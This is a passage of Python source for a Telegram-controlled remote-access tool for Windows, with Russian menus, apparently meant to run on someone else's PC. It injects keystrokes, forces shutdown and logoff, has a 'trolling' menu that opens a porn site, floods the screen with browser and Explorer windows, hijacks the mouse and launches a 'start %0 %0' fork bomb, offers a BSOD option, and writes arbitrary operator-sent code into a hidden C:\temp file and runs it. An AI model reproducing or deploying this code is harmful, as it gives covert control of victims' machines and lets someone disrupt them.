        item0=types.KeyboardButton("enter")
        item1=types.KeyboardButton("backspace")
        item2=types.KeyboardButton("space")
        item3=types.KeyboardButton("tab")
        item4=types.KeyboardButton("ctrl+c")
        item5=types.KeyboardButton("ctrl+a")
        item6=types.KeyboardButton("ctrl+v")
        item7=types.KeyboardButton("ctrl+z")
        item8=types.KeyboardButton("ctrl+s")
        item9=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        markup.add(item7)
        markup.add(item8)
        markup.add(item9)
        bot.send_message(message.chat.id, '⌨️ *Впишите то, что хотите написать, или выберите клавиши из списка ниже!\nВписать собственное вы может по примеру ниже:\nalt+f4, enter - нажмется alt+f4 вместе, а только потом enter*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, keyboard_word2)

def keyboard_word2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == "Назад":
            keyboard_menu(message)
        
        elif message.text.strip() == '/start':
            start(message)

        elif message.text.strip() == "enter":
            keyboard.press("enter")
            keyboard_word(message)

        elif message.text.strip() == "backspace":
            keyboard.press("backspace")
            keyboard_word(message)

        elif message.text.strip() == "space":
            keyboard.press("space")
            keyboard_word(message)

        elif message.text.strip() == "tab":
            keyboard.press("tab")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+a":
            keyboard.press("ctrl+a")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+z":
            keyboard.press("ctrl+z")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+c":
            keyboard.press("ctrl+c")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+v":
            keyboard.press("ctrl+v")
            keyboard_word(message)

        elif message.text.strip() == "ctrl+s":
            keyboard.press("ctrl+s")
            keyboard_word(message)

        else:
            word = message.text.strip()
            keyboard.write(word, delay=0.25)
            keyboard_word(message)





def keyboard_keys(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("ctrl+shift+esc")
        item1=types.KeyboardButton("alt+tab")
        item2=types.KeyboardButton("alt+F4")
        item3=types.KeyboardButton("win+e")
        item4=types.KeyboardButton("tab")
        item5=types.KeyboardButton("del")
        item6=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        bot.send_message(message.chat.id, '⌨️ *Впишите или выберите ниже то, что хотите выполнить!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, keyboard_keys2)

def keyboard_keys2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == "Назад":
                keyboard_menu(message)

            elif message.text.strip() == '/start':
                start(message)

            else:
                word = message.text.strip()
                keyboard.send(word)
                keyboard_keys(message)
        
        except ValueError:
            bot.send_message(message.chat.id, '❌ *Одна или несколько из клавиш не была найдена! Повторите попытку*', parse_mode='Markdown')
            keyboard_keys(message)



def samp_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Подключение к SAMP серверу")
        item1=types.KeyboardButton("Подключение к RakLaunch Lite")   
        item2=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        bot.send_message(message.chat.id, '*😇 Вы в меню SAMP!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, samp_check)

def samp_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        cmd = message.text.strip()

        if cmd == "Назад":
            mainmenu(message)

        elif cmd == "/start":
            start(message)

        elif message.text.strip() == 'Подключение к SAMP серверу':
            bot.send_message(message.chat.id, '✍️ *Введите IP сервера, на который вы хотите зайти!\n\nP.s. будет использоваться ник, под которым вы играли в последний раз!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, samp_connect)

        elif message.text.strip() == 'Подключение к RakLaunch Lite':
            bot.send_message(message.chat.id, '✍️ *Введите информацию по форме ниже:\nnickname,ip,port\nПример: Little_Bot,127.0.0.1,7777*', parse_mode='Markdown')
            bot.register_next_step_handler(message, raklite_connect)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            samp_menu(message)





def mainmenu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("/start")
        item1=types.KeyboardButton("Консоль")   
        item2=types.KeyboardButton("Файлы и папки")
        item3=types.KeyboardButton("Клавиши")
        item4=types.KeyboardButton("Троллинг")
        item5=types.KeyboardButton("SAMP функции")
        item6=types.KeyboardButton("Особые функции")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)
        bot.send_message(message.chat.id, '*📌 Вы в главном меню!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_main)

def check_main(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Файлы и папки':
            files(message)

        elif message.text.strip() == 'Консоль':
            console_menu(message)

        elif message.text.strip() == '/start':
            start(message)

        elif message.text.strip() == 'Клавиши':
            keyboard_menu(message)
        
        elif message.text.strip() == 'Троллинг':
            packs(message)

        elif message.text.strip() == 'Особые функции':
            other_functions(message)

        elif message.text.strip() == 'SAMP функции':
            samp_menu(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            mainmenu(message)





def other_functions(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Удаление папки со скриптом")
        item1=types.KeyboardButton("Выход из скрипта")
        item2=types.KeyboardButton("Вызывать BSOD")
        item3=types.KeyboardButton("Выход из учетной записи")
        item4=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        bot.send_message(message.chat.id, '🔑 *Выберите нужную функцию!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_other)


def check_other(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Удаление папки со скриптом':
            full_delete(message)

        elif message.text.strip() == 'Выход из скрипта':
            script_exit(message)

        elif message.text.strip() == 'Назад':
            mainmenu(message)

        elif message.text.strip() == 'Выход из учетной записи':
            logout(message)

        elif message.text.strip() == 'Вызывать BSOD':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Да, конечно")
            item1=types.KeyboardButton("Нет, я передумал")
            markup.add(item0)
            markup.add(item1)
            bot.send_message(message.chat.id, '❌ *Вы уверены, что хотите вызвать BSOD?*', parse_mode='Markdown', reply_markup=markup)
            bot.register_next_step_handler(message, bsod)

        elif message.text.strip() == '/start':
            start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            other_functions(message)





def logout(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, '☑️ *Вы вышли из учетной записи*', parse_mode='Markdown')
        return subprocess.run('shutdown /l')





def script_exit(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Да, подтверждаю")
        item1=types.KeyboardButton("Нет, я передумал")
        markup.add(item0)
        markup.add(item1)
        bot.send_message(message.chat.id, '😢 *Подтвердите выход!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_exit)

def check_exit(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Да, подтверждаю':
            bot.send_message(message.chat.id, '😥 *Вы завершили работу скрипта!*', parse_mode='Markdown')
            os.abort()

        elif message.text.strip() == 'Нет, я передумал':
            other_functions(message)

        elif message.text.strip() == '/start':
            start(message)

        else:
            other_functions(message)





def packs(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Выключение ПК")
        item1=types.KeyboardButton("Открыть порно")
        item2=types.KeyboardButton("Массовое открытие сайтов")
        item3=types.KeyboardButton("Массовое открытие проводника")
        item4=types.KeyboardButton("Массовое перемещение мышки")
        item5=types.KeyboardButton("start %0 %0")
        item6=types.KeyboardButton("Назад")
        markup.add(item0)
        markup.add(item1)
        markup.add(item2)
        markup.add(item3)
        markup.add(item4)
        markup.add(item5)
        markup.add(item6)

        bot.send_message(message.chat.id, '👺 *Вы в меню троллинга!*', reply_markup=markup, parse_mode='Markdown')
        bot.register_next_step_handler(message, check_packs)

def check_packs(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Выключение ПК':
            bot.send_message(message.chat.id, '☑️ *Вы успешно использовали функцию выключения ПК!*', parse_mode='Markdown')
            os.system('chcp 1251')
            os.system('shutdown /s /t 0')
            packs(message)
        
        elif message.text.strip() == 'Открыть порно':
            whatopen = 'http://xvideos.com'
            webbrowser.open(str(whatopen), new=1)
            bot.send_message(message.chat.id, '☑️ *Вы успешно использовали функцию открытия порно!*', parse_mode='Markdown')
            packs(message)

        elif message.text.strip() == '/start':
            start(message)
        
        elif message.text.strip() == 'Назад':
            mainmenu(message)

        elif message.text.strip() == 'start %0 %0':
            my_file = open("troll.bat", "w", encoding="utf-8")
            my_file.write('start %0 %0')
            my_file.close()

            os.startfile("troll.bat")
            bot.send_message(message.chat.id, '☑️ *Start %0 %0 успешно запущен!*', parse_mode='Markdown')
            packs(message)

        elif message.text.strip() == 'Массовое открытие сайтов':
            bot.send_message(message.chat.id, '✍️ *Введите сколько раз вы хотите открыть сайты!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, troll_site)

        elif message.text.strip() == 'Массовое открытие проводника':
            bot.send_message(message.chat.id, '✍️ *Введите сколько раз вы хотите открыть проводник!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, troll_provod)

        elif message.text.strip() == 'Массовое перемещение мышки':
            bot.send_message(message.chat.id, '✍️ *Введите сколько секунд вы хотите перемещать мышь!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, mouse_troll)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            packs(message)





def mouse_troll(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xmouse = message.text.strip()

        if str(xmouse) == "/start":
            start(message)

        else:
            bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xmouse} секунд!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xmouse)):
                pyautogui.moveTo(147, 154, duration=0.10)
                pyautogui.moveTo(325, 635, duration=0.10)
                pyautogui.moveTo(500, 489, duration=0.10)
                pyautogui.moveTo(1299, 963, duration=0.10)
                pyautogui.moveTo(327, 655, duration=0.10)
                pyautogui.moveTo(798, 655, duration=0.10)
                pyautogui.moveTo(25, 752, duration=0.10)
                pyautogui.moveTo(1058, 162, duration=0.10)
                pyautogui.moveTo(1263, 825, duration=0.10)
                pyautogui.moveTo(558, 265, duration=0.10)

            else:
                bot.send_message(message.chat.id, '☑️ *Скрипт на перемещение мышки успешно выполнился!*', parse_mode='Markdown')





def troll_provod(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xprovod = message.text.strip()

        if str(xprovod) == "/start":
            start(message)

        else:
            bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xprovod} раз!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xprovod)):
                keyboard.send("win+e")

            else:
                bot.send_message(message.chat.id, '☑️ *Скрипт на открытие проводника успешно выполнился!*', parse_mode='Markdown')





def troll_site(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xsite = message.text.strip()

        if str(xsite) == "/start":
            start(message)

        else:
            bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xsite} раз!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xsite)):
                webbrowser.open('https://dzen.ru', new = 1)
                webbrowser.open('https://youtube.com', new = 1)
                webbrowser.open('https://www.google.com', new = 1)
                webbrowser.open('https://yandex.ru', new = 1)
                webbrowser.open('https://edu.gounn.ru', new = 1)
                            
            else:
                bot.send_message(message.chat.id, '☑️ *Скрипт на открытие сайтов успешно выполнился!*', parse_mode='Markdown')


def full_delete(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, f"import shutil\n\nshutil.rmtree('{os.path.abspath(os.curdir)}')")
        bot.register_next_step_handler(message, full_delete_open)


def full_delete_open(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        text = message.text.strip()

        if os.path.exists('C:\\temp') == False:
            fileName = r'C:\temp'
            os.mkdir(fileName)
            kernel32 = ctypes.windll.kernel32
            attr = kernel32.GetFileAttributesW(fileName)
            kernel32.SetFileAttributesW(fileName, attr | 2)

        if str(text) == "/start":
            start(message)

        else:
            my_file = open("C:\\temp\\DeleteFile.py", "w", encoding="utf-8")
            my_file.write(str(text))
            my_file.close()

            os.system("python C:\\temp\\DeleteFile.py")
            other_functions(message)



if __name__ == '__main__':
    bot.infinity_polling(none_stop = True)